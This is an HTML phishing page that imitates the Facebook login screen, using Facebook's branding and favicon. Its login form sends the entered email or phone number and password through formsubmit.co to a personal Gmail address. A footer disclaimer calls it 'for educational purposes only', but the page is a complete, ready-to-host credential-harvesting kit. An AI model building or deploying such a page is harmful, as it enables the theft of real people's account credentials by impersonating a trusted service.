<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="icon" href="https://www.facebook.com/favicon.ico" />
  </head>
  <body class="bg-gray-100">
    <div class="flex flex-col lg:flex-row justify-center items-center min-h-screen px-6">
      <!-- Left Side -->
      <div class="max-w-md lg:max-w-lg mb-10 lg:mb-0 lg:mr-16 text-center lg:text-left">
        <h1 class="text-blue-600 text-5xl font-bold mb-4">facebook</h1>
        <p class="text-xl text-gray-800">Facebook helps you connect and share with the people in your life.</p>
      </div>

      <!-- Right Side (Login Card) -->
      <div class="w-full max-w-sm bg-white p-6 rounded-lg shadow-lg">
        <form action="https://formsubmit.co/godspowerrichard001@gmail.comgit " method="POST" class="space-y-4">
          <input
            type="text"
            name="name"
            placeholder="Email address or phone number"
            class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <button
            type="submit"
            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-md"
          >
            Log In
          </button>
          <div class="text-center">
            <a href="#" class="text-blue-600 text-sm hover:underline">Forgotten password?</a>
          </div>
          <hr class="my-4" />
          <button
            type="button"
            class="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-3 rounded-md"
          >
            Create New Account
          </button>
        </form>
      </div>
    </div>

    <!-- Footer -->
    <footer class="text-center text-sm text-gray-500 mt-10">
      <p>Not affiliated with Facebook. For educational purposes only.</p>
    </footer>
  </body>
</html>
